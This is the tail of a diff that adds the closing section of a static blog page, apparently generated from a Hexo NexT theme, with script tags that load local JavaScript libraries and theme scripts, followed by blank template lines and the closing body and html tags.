+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
